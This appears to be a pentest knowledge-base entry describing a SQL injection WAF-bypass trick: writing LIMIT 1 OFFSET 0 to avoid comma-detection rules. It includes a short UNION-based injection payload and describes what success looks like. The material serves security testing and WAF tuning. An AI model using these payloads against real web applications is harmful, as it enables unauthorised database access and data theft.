---
type: command
executor: sql
data: LIMIT 1 OFFSET 0
tags:
  - sql-injection
  - waf-bypass
platforms:
  - Web
verified: true
validated: true
---

# sql-limit-to-offset-bypass

## Command

```sql
LIMIT 1 OFFSET 0
```

## Description

This SQL clause limits query results to 1 row starting from offset 0, serving as a WAF bypass for comma-based LIMIT syntax (e.g., LIMIT 0,1) in MySQL environments. Use in SQLi payloads to control result pagination without triggering comma-detection rules.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 1 | Number of rows to return (equivalent to original second LIMIT param) | Yes |
| OFFSET 0 | Starting position for results (equivalent to original first LIMIT param) | Yes |

## Examples

### Basic Usage

```sql
SELECT * FROM users LIMIT 1 OFFSET 0;
```

### Advanced Usage

```sql
' UNION SELECT null FROM dual LIMIT 10 OFFSET 5 --;
```

## Expected Output

The query executes and returns the specified number of rows from the given offset, e.g., the first row of results without WAF intervention. Success: No error, data appears in application response.

## Related

- [[procedures/SQL-Injection-WAF-Bypass-with-OFFSET-FROM-and-JOIN]]
